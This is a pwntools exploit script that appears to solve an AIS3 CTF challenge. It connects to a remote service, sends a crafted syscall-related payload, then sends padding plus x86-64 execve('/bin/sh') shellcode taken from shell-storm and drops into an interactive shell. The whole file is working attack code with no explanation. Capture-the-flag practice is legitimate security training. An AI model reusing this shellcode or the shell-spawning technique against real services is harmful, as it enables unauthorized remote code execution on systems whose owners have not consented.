# -*- coding: utf-8 -*-
#!/usr/bin/env python
#

from pwn import *

context.arch = "amd64"
context.os = "linux"
context.endian = "little"
# ["CRITICAL", "DEBUG", "ERROR", "INFO", "NOTSET", "WARN", "WARNING"]
context.log_level = "DEBUG"

is_local = False

host = "srv01.ctf.ais3.org"
port = 5522
if is_local:
    host = "127.0.0.1"
    port = 8888
r = remote(host, port)

input("Attach in gdb and press Enter")

log.info(asm("syscall"))
payload = b"\x01\xff\xf2\x5e\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x5a\x0f\x05\x05\x05\x05\x05\x05\x05"
#payload = flat([])
log.info("payload: " + str(payload))
r.send(payload)

sleep(5)

# http://shell-storm.org/shellcode/files/shellcode-806.php
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
print(repr(shellcode))

r.send(b"A" * 0xd + shellcode)

r.interactive("Pwned # ")

